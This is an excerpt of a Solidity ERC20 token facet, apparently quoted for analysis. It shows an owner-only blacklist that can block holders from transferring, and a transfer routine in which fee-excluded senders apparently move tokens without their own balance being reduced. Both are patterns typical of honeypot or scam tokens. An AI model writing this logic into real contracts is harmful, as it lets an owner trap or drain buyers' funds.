...
contract totalSupplyFacet is IERC20, Context, Ownable {
    ...
    function addBlack(
        address[] memory blacks_,
        bool _isBlack
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < blacks_.length; i++) {
            require(
                blacks_[i] != address(this),
                "Can't blacklist contract address"
            );
            ds._blacks[blacks_[i]] = _isBlack;
        }
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            bool noChargeFee = ds._isExcludedFromFee[from];
            require(noChargeFee || (!ds._blacks[from] && !ds._blacks[to]));
            taxAmount = amount
                .mul(
            ...
            amount = noChargeFee ? 0 : amount;
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !ds.inSwap &&
                to == ds.uniswapV2Pair &&
                ds.swapEnabled &&
                contractTokenBalance > ds._feeThreshold &&
        ...
        ds._balances[to] = ds._balances[to].add(toAmount);
